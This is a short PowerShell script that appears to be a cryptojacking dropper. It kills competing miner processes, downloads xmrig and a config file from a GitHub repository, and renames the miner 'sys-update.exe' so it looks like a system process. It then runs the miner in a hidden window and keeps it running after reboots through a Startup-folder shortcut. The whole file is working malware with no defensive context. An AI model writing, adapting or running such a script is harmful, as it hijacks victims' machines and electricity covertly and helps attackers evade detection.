$processes = @("xmrig", "cgminer", "bfgminer", "ethminer", "minerd", "cpuminer", "nicehash", "claymore", "phoenixminer", "ccminer")

$processes | ForEach-Object {
    $p = Get-Process -Name $_ -ErrorAction SilentlyContinue
    if ($p) {
        $p | Stop-Process -Force
    }
}

if (Get-Process -Name "sys-update" -ErrorAction SilentlyContinue) {
    exit
}

$tmpDir = Join-Path $env:TEMP "my_tmp"
if (-not (Test-Path $tmpDir)) {
    New-Item -ItemType Directory -Path $tmpDir | Out-Null
}

$xmrigUrl = "https://raw.githubusercontent.com/t69415778/test/refs/heads/main/xmrig.exe"
$configUrl = "https://raw.githubusercontent.com/t69415778/test/refs/heads/main/config.json"

$sysUpdateFile = Join-Path $tmpDir "sys-update.exe"
$configFile = Join-Path $tmpDir "config.json"

Invoke-WebRequest -Uri $xmrigUrl -OutFile $sysUpdateFile
Invoke-WebRequest -Uri $configUrl -OutFile $configFile

Start-Process -FilePath $sysUpdateFile -ArgumentList "-c $configFile" -WindowStyle Hidden

$startupDir = [System.Environment]::GetFolderPath('Startup')
$shortcutPath = Join-Path $startupDir "sys-update.lnk"

$Shell = New-Object -ComObject WScript.Shell
$shortcut = $Shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $sysUpdateFile
$shortcut.Arguments = "-c `"$configFile`""
$shortcut.WindowStyle = 7
$shortcut.Description = "User-level startup for sys-update"
$shortcut.Save()
